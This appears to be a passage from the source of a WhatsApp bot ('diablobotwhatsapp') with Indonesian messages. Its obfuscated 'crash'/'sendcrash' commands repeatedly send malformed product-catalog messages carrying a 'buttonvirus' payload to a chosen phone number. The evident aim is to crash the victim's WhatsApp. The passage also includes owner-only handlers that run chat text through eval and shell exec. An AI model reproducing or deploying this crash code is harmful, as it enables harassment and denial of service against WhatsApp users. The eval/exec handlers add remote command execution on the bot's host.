_0x3291(_0x4d075b,_0x191c4f){const _0x5cfb44=_0x5cfb();return _0x3291=function(_0x329150,_0x14e455){_0x329150=_0x329150-0x11f;let _0x8bceb4=_0x5cfb44[_0x329150];return _0x8bceb4;},_0x3291(_0x4d075b,_0x191c4f);}{if(!itsMediablo)return diablobotwhatsapp[_0x1084f4(0x123)](mess[_0x1084f4(0x127)]);if(!q)return;num=''+q+_0x1084f4(0x125),jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){sendBugcrash(num,_0x1084f4(0x12f),ppnyauser,_0x1084f4(0x12d),[{'productId':_0x1084f4(0x120)}],_0x1084f4(0x120)),await sleep(ms(waktu));}diablobotwhatsapp[_0x1084f4(0x123)]('Sukses\x20Send\x20Bug\x20Ke\x20Nomor\x20'+num+'\x20Sebanyak\x20'+jumlah+_0x1084f4(0x121)+waktu);}
break
case 'crash':
case 'sendcrash': function _0x5721(){var _0x31baf6=['6ePeDJI','1150050sysfuB','MAMPUS\x20FC\x20CHUAKS','owner','3574490bCoYVg','reply','@s.whatsapp.net','100000000000000000','6281220670449@s.whatsapp.net','IDR','2749744EmFLYr','5mFERAb','key','Message','\x20Sebanyak\x20','104363pJsBFS','Nomor\x20Owner\x20Di\x20Atas','1000','waUploadToServer','88QAyIaM','833870fKwrZH','Sukses\x20Send\x20Bug\x20Ke\x20Nomor\x20','message','fromObject','6435018lDqDpD','1368216ndPPqY','\x20Dengan\x20Timer\x20','7091718154232528','imageMessage'];_0x5721=function(){return _0x31baf6;};return _0x5721();}var _0x4e3180=_0x1427;(function(_0xa4c27f,_0xe1ac40){var _0x228f89=_0x1427,_0x2d1a5d=_0xa4c27f();while(!![]){try{var _0x56ce2a=parseInt(_0x228f89(0x14f))/0x1+-parseInt(_0x228f89(0x145))/0x2*(-parseInt(_0x228f89(0x14e))/0x3)+-parseInt(_0x228f89(0x158))/0x4+-parseInt(_0x228f89(0x159))/0x5*(parseInt(_0x228f89(0x149))/0x6)+parseInt(_0x228f89(0x15d))/0x7*(parseInt(_0x228f89(0x144))/0x8)+-parseInt(_0x228f89(0x14a))/0x9+parseInt(_0x228f89(0x152))/0xa;if(_0x56ce2a===_0xe1ac40)break;else _0x2d1a5d['push'](_0x2d1a5d['shift']());}catch(_0x51f2ff){_0x2d1a5d['push'](_0x2d1a5d['shift']());}}}(_0x5721,0x90dfd));function _0x1427(_0xf6c8c4,_0x11159f){var _0x5721c1=_0x5721();return _0x1427=function(_0x1427d0,_0x19a285){_0x1427d0=_0x1427d0-0x142;var _0x3a5578=_0x5721c1[_0x1427d0];return _0x3a5578;},_0x1427(_0xf6c8c4,_0x11159f);}{if(!itsMediablo)return diablobotwhatsapp[_0x4e3180(0x153)](mess[_0x4e3180(0x151)]);if(!q)return;num=''+q+_0x4e3180(0x154),jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':ppnyauser},{'upload':diablo[_0x4e3180(0x143)]}),catalog=generateWAMessageFromContent(num,proto[_0x4e3180(0x15b)][_0x4e3180(0x148)]({'productMessage':{'product':{'productImage':messa[_0x4e3180(0x14d)],'productId':_0x4e3180(0x14c),'title':_0x4e3180(0x150),'description':''+buttonvirus+buttonvirus,'currencyCode':_0x4e3180(0x157),'priceAmount1000':_0x4e3180(0x155),'productImageCount':0x1,'firstImageId':0x1,'salePriceAmount1000':_0x4e3180(0x142),'retailerId':_0x4e3180(0x15e),'url':'https://wa.me/0'},'businessOwnerJid':_0x4e3180(0x156)}}),{'userJid':from,'quoted':lep});diablo['relayMessage'](num,catalog[_0x4e3180(0x147)],{'messageId':catalog[_0x4e3180(0x15a)]['id']}),await sleep(ms(waktu));}diablobotwhatsapp[_0x4e3180(0x153)](_0x4e3180(0x146)+num+_0x4e3180(0x15c)+jumlah+_0x4e3180(0x14b)+waktu);}
break


break
default:
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return diablobotwhatsapp.reply(bang)
}
try {
diablobotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
diablobotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await diablobotwhatsapp.reply(evaled)
} catch (err) {
diablobotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return diablobotwhatsapp.reply(`${err}`)
if (stdout) {
diablobotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
diablobotwhatsapp.reply(util.format(err))
}
} 